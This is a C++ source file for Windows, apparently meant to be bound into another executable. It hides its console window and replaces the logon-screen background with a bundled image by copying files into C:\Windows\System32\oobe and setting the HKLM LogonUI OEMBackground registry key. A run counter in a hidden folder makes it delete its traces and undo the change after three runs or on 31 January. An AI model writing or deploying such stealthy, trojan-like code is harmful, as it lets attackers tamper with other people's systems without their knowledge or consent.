// Image is already binded in executable file through binder
#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>
 
using namespace std;
 
void Stealth();
void Stealth()
{
  HWND Stealth;
  AllocConsole();
  Stealth = FindWindowA("ConsoleWindowClass", NULL);
  ShowWindow(Stealth,0);
}
 
int main(int argc, char** argv) 
{
	Stealth();
	Sleep(800);
	char a;char line[2];int i=0;
	time_t now=time(NULL);
	struct tm *tm=localtime(&now);
	
	system("mkdir C:\\Windows\\Surrce");
    Sleep(250);
	
	if((tm->tm_mday)>=31 && (tm->tm_mon + 1)==1)
	{
		system("DEL C:\\Windows\\Surrce\\temp.txt /f");
		     system("DEL C:\\Windows\\System32\\oobe\\info\\backgrounds\\backgroundDefault.jpg /f");
		system("\"REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Authentication\\LogonUI\\Background /v OEMBackground /t REG_DWORD /d 0 /f\"");
        Sleep(200);
        return 0;
	}
	
	fstream fs_obj("C:\\Windows\\Surrce\\temp.txt",ios::in);
	    if(!fs_obj)
	    {
	    	std::cout<<"first time\n";
	    	fs_obj.open("C:\\Windows\\Surrce\\temp.txt",ios::out | ios::app);
	    	Sleep(25);
		    fs_obj<<"1";
	        fs_obj.close();
	        goto next;
	    	exit(0);
		}
		while(fs_obj.getline(line,2))
		for(i=0;i<1;i++)
	     { 
	      if(line[i]=='3')
		    {
		      std::cout<<"match\n";
		      fs_obj.close();
		      system("DEL C:\\Windows\\Surrce\\temp.txt /f");
		      system("DEL C:\\Windows\\System32\\oobe\\info\\backgrounds\\backgroundDefault.jpg /f");
			  system("\"REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Authentication\\LogonUI\\Background /v OEMBackground /t REG_DWORD /d 0 /f\"");
              Sleep(200);
		      return 0;
        	}
		  else
	        {
	          int k = atoi (line);
	          std::cout<<k<<"\n";
	          k=k+1;
	          std::cout<<k<<"\n";
	    	  std::cout<<"not match\n";
	    	  fs_obj.close();
	    	  Sleep(20);
	    	  fs_obj.open("C:\\Windows\\Surrce\\temp.txt",ios::out);
		      Sleep(20);
			  fs_obj<<k;
	    	  fs_obj.close();
	    	  Sleep(20);
	    	  goto next;
		    }
	     }
		
		next:
			{
               system("copy myboot.zx C:\\Windows\\Surrce\\");
               Sleep(200);
               system("RENAME C:\\Windows\\Surrce\\myboot.zx backgroundDefault.jpg");
               Sleep(200);
               system("mkdir C:\\Windows\\System32\\oobe\\info");
               Sleep(200);
               system("mkdir C:\\Windows\\System32\\oobe\\info\\backgrounds");
               Sleep(200);
               system("move C:\\Windows\\surrce\\backgroundDefault.jpg C:\\Windows\\System32\\oobe\\info\\backgrounds\\");
               Sleep(200);
               system("\"REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Authentication\\LogonUI\\Background /v OEMBackground /t REG_DWORD /d 1 /f\"");
               Sleep(250);
               return 0;
			}
	return 0;
}
